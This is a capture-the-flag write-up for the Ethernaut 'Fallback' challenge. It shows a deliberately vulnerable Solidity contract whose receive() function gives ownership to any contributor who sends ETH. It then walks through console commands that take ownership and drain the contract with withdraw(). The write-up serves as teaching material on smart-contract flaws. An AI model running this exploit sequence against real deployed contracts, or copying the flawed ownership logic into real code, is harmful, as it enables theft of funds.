# Fallback Challenge

### The goal of this challenge is to claim the ownership of the contract and reduce it's balance to 0 by sending it to your wallet

Smart Contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

- The first step is to claim the ownership of the smart contract and to do that we will call the contribute function to become a contributor.

Here's how we will call the contribute function in the ethernaut console.

```
await contract.contribute({value: "<enter value here in wei that is less than 0.001 eth>"}) 
// here's how we can find the value in wei 
// In the console use `await contract.toWei("enter in eth")`
```

- Now we can call the `getContribution` function and that would show that we are now contributors so now we can call the recieve() function by just sending a transaction and we will get the ownership of the contract.

```
await contract.sendTransaction({value: <value in wei>})
```

- Now if we check the owner, we will be the owner of the contract, So let's withdraw all the eth from the account by running the `withdraw` function.

```
await contract.withdraw();
```

And BOOM!!!
There's your hacked Contract.